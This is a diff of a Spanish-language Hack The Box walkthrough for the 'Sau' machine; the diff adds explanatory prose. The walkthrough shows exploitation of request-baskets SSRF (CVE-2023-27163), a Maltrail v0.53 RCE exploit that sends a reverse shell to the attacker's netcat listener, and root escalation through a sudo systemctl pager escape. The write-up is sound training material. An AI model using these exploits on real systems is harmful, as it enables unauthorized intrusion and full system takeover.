@@ -170,44 +170,48 @@ Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado 
 
 <figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Initial Access
 
 ### requests-baskets 1.2.1 Exploitation (SSRF - Server Side Request Forgery) (CVE-2023-27163)
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+Al acceder a [http://10.10.11.224:55555](http://10.10.11.224:55555) nos encontramos con la interfaz de `Request Basket` en una versión 1.2.1-
 
+Verificamos que podemos crear un nuevo `Basket`, probaremos de ver primero cómo funciona la herramienta.
 
+{% hint style="info" %}
+Request Baskets es un servicio web diseñado para capturar solicitudes HTTP arbitrarias y facilitar su inspección a través de una API RESTful o una interfaz de usuario web sencilla.
+
+Este servicio se inspira en los conceptos y principios de diseño de aplicaciones del proyecto RequestHub y recrea la funcionalidad que ofrecía anteriormente el servicio RequestBin.
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+Se nos generará un nuevo `Basket` con un `Token`, abriremos el `Basket` para probar sus funcionalidades.
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificaremos el siguiente panel en el cual todas las respuestas al `Basket` creado aparecerán en el sitio web.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Hacemos una prueba de enviar una petición por `GET` al `Basket` creado y comprobamos que se nos ve reflejada en el `Basket`.
 
 ```bash
 ❯ curl -s -X GET http://10.10.11.224:55555/l67yrgc
 ```
 
-
-
 <figure><img src="../../.gitbook/assets/imagen (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+En las opciones presentes, nos aparece la opción de Configuración en la cual nos permite realizar un `Forward` hacía una dirección  URL. En esta prueba, nos levantamos un servidor web y configuramos el `Basket` para que haga el `Forward` hacía nuestro servidor.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
 <figure><img src="../../.gitbook/assets/4171_vmware_fG2KpvnjwN.png" alt=""><figcaption></figcaption></figure>
 
-
+Enviamos una petición por `GET` y comprobamos que recibimos la solicitud, por lo tanto, parece ser que el `Forward` se está realizando.
 
 ```bash
 ❯ curl -s -X GET http://10.10.11.224:55555/l67yrgc
@@ -218,15 +222,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.224 - - [26/Jan/2025 23:15:56] "GET /test HTTP/1.1" 404 -
 ```
 
+Probaremos de informar en el `Forward` que rediriga al localhost del propio servidor, para ver si podemos realizar un `Server Side Request Forgery`.
 
+<figure><img src="../../.gitbook/assets/imagen (6) (1) (1).png" alt="" width="444"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
+Al acceder al `Basket` creado, comprobamos que hemos sido redirigidos a una página interna deñ servidor, por lo que parece ser que el `SSRF` se ha realizado correctamente.
 
 <figure><img src="../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Otra de las maneras que encontramos de explotar de manera automática esta vulnerabilidad, es a través del siguiente repositorio de GitHub.
 
 {% embed url="https://github.com/entr0pie/CVE-2023-27163" %}
 
@@ -246,7 +250,7 @@ CVE-2023-27163.sh                                         100%[=================
 
 </code></pre>
 
-
+Ejecutaremos el exploit indicándole la URL target y dónde queremos que se realice el `SSRF` hacía el localhost de la propia máquina. Comprobaremos que se nos ha creado un nuevo `Basket` en donde podemos verificar el `Server Side Request Forgery`.
 
 ```bash
 ❯ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
@@ -258,17 +262,19 @@ Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at htt
 > Authorization: Ny3T46IMJU35s4oGuVDXT4yrFdQ7h-CxrBgWGvsu0pXB
 ```
 
+### Maltrail v.053 - Username Injection - Remote Code Execution \[RCE]&#x20;
 
+Accederemos al `Basket` del `SSRF` realizado y verificaremos que se trata de un panel de inicio de sesión de `Maltrail v.053`.
+
+{% hint style="info" %}
+Maltrail es un sistema de detección de tráfico malicioso que utiliza listas (negras) disponibles públicamente que contienen rastros maliciosos y/o generalmente sospechosos, junto con rastros estáticos compilados a partir de varios informes de AV y listas personalizadas definidas por el usuario.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (10) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Revisando posibles vulnerabilidades del software, nos encontramos con el siguiente exploit el cual se aprovecha de los campos del formulario de inicio de sesión para conseguir un `Remote Code Execution (RCE)`.
 
 {% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}
-
-
 
 ```bash
 ❯ git clone https://github.com/spookier/Maltrail-v0.53-Exploit; cd Maltrail-v0.53-Exploit
@@ -281,21 +287,21 @@ Recibiendo objetos: 100% (17/17), 4.44 KiB | 2.22 MiB/s, listo.
 Resolviendo deltas: 100% (4/4), listo.
 ```
 
-
+En una termianl nos pondremos en escucha para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Lanzaremos el exploit indicándole nuestra dirección IP y puerto donde estaremos en escucha y el `Basket` vulnerable a `SSRF` que hemos creado anteriormente.
 
 ```bash
 ❯ python3 exploit.py 10.10.16.5 443 http://10.10.11.224:55555/l67yrgc
 Running exploit on http://10.10.11.224:55555/l67yrgc/login
 ```
 
-
+Revisaremos que ganamos acceso a la máquina y podemos visualizar la flag de **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -309,7 +315,11 @@ cat /home/puma/user.txt
 a7e0ab0a8************************
 ```
 
+## Privilege Escalation
 
+### Abusing sudoers privilege (systemctl)
+
+Revisando los permisos **sudoers** que dispone el usuario `puma`, nos encontramos que el usuario puede ejecutar como **sudo** el comando `/usr/bin/systemctl status trail.service`.
 
 ```bash
 puma@sau:/opt/maltrail$ sudo -l
@@ -321,7 +331,7 @@ User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
 
-
+Sabiendo que podemos ejecutar el `systemctl` como usuario `sudo`. El objetivo es ejecutar la instrucción y que se ponga en modo "paginate" como con el comando `LESS`. En caso de que nos deje, podremos ejecutar comandos fuera del output y proporcionarnos una bash como usuario `root`. Logramos visualizar la flag de **root.txt**.
 
 ```bash
 puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
@@ -354,3 +364,9 @@ root
 root@sau:/opt/maltrail# cat /root/root.txt
 5275ac8db31*********************
 ```
+
+{% hint style="danger" %}
+En caso de que no se nos pusiera en modo `less`, podemos jugar con el tamaño de columnas y filas `stty` para convertir la terminal más pequeña y al ejeuctar el `systemctl` se nos ponga en modo paginate.
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/4219_vmware_0dk4oSUiCF.png" alt="" width="369"><figcaption></figcaption></figure>
